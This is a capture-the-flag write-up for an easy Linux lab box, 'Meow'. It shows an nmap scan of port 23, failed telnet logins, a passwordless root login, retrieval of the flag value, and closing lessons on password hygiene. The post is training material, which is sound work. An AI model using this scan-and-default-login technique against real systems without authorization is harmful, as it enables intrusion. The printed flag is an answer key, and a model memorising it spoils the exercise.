
## **Overview**

- **Difficulty:** Easy
- **Operating System:** Linux
- **Objective:** Capture flag via Telnet
- **Tools Used:** `nmap`, `telnet`, `openvpn`

---

## **Scanning using Nmap**

Started with a nmap scan to get information about whether telnet was running on port 23 as mentioned in the task.
```
$ sudo nmap -p23 10.129.109.246
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 17:56 IST
Nmap scan report for 10.129.109.246
Host is up (0.63s latency).

PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

And, it is!

---

## **Accessing Telnet at 10.129.109.246**

Now, let's `telnet` into said IP.
```
$ telnet 10.129.109.246
Trying 10.129.109.246...
Connected to 10.129.109.246.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: admin
Password: 

Login incorrect
Meow login: host
Password: 

Login incorrect
Meow login: 
Login timed out after 60 seconds.
Connection closed by foreign host.

...
```

I tried a bunch of usernames but nothing seemed to work.
After a little research and hint from an answer in the machine it is clear that maybe `root` as the username will do the trick. So, let's give it a shot.
```
$ telnet 10.129.109.246
Trying 10.129.109.246...
Connected to 10.129.109.246.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 02 Jan 2025 12:30:17 PM UTC

  System load:           0.01
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.109.246
  IPv6 address for eth0: dead:beef::250:56ff:fe94:c1c7

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~#
```

---
## **Flag Retrieval**

Let's start by listing the content on the target:
```
root@Meow:~# ls
flag.txt  snap
```

Next, we will `cat` the content of `flag.txt` as:
```
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```

---
## **Flag**

The flag is `b40abdfe23665f766f9c61ecba8a4c19`.

---
## **Lessons Learned**

- A lot of the times, services are configured for ease of access with one username that does not have a password or some easy password. This can easily be guessed as I did or even bruteforced and automated.
- The best way to mitigate this issue is place solid standards on passwords by not only maintaining long complex password but also changing them regularly. As for ease of use, a password manager can be used to receive the password like MFA to log in or out.

---

**Prepared by Araiz Naqvi**